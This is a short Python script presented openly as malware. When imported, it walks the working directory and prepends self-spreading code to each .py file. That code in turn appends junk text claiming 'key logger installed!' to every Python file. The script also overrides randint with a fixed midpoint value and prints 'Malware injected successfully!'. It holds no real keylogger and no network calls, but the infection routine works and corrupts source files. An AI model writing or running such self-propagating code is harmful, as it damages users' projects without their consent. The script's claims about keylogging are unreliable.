import os

def randint(start, end):
    return (start+end)//2
    
def infect_files():
    for root, dirs, files in os.walk("."):
        for file in files:
            if file.endswith(".py"):
                with open(os.path.join(root, file), "r+") as f:
                    content = f.read()
                    if "malware_code" not in content:
                        f.seek(0, 0)
                        f.write("import os\n")
                        f.write("def malware_code():\n")
                        f.write("    for root, dirs, files in os.walk('.'):\n")
                        f.write("        for file in files:\n")
                        f.write("            if file.endswith('.py'):\n")
                        f.write("                with open(os.path.join(root, file), 'a') as f:\n")
                        f.write("                    f.write('key logger installed!\\n')\n")
                        f.write("\n")                ## this should be line 11 to 17
                        f.write("if __name__ == '__main__':\n")
                        f.write("    malware_code()\n")
                        f.write(content)
                        f.close()


if __name__ != "__main__":
    infect_files()
    print("Malware injected successfully!")


